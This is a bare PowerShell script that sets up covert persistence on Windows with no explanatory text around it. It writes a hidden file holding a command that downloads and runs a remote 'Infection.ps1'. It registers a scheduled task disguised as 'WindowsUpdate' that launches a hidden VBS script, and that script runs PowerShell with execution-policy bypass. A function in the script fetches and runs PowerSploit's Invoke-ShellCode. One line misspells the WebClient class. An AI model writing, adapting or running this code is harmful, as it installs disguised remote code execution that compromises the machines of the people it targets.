{

New-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -type file -force
Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt "IEX ((New-Object New.WebClient).DownloadString('https://raw.githubusercontent.com/akalist06/PowershellInfection/new/master/Infection.ps1')); FetchCommands -Force"
Set-ItemProperty -Path $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
schtasks /create /TN WindowsUpdate /TR 'C:\Windows\System32\wscript.exe //NoLogo //B c:\Microsoft\Windows\Desktop\Initialize.vbs' /sc OnIdle /i 20
New-Item 'c:\Microsoft\Windows\Desktop\Initialize.txt' -type file -Force
Add-Content c:\Microsoft\Windows\Desktop\Initialize.txt "Dim objShell'r'nSetobjShell = WScript.CreateObject( ""WScript.Shell"" )'r'ncommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile Invoke-Command -ScriptBlock {Get-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt | Invoke-Expression}"" 'r'nobjShell.Run command,0'r'nSet objShell = Nothing"
Rename-Item c:\Microsoft\Windows\Desktop\Initialize.txt Initialize.vbs
Set-ItemProperty -Path c:\Microsoft\Windows\Desktop\Initialize.vbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}

Function FetchCommands
{
    IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/akalist06/PowerShellInfection/new/master/PowerSploit/CodeExecution/Invoke-ShellCode.ps1'));
}
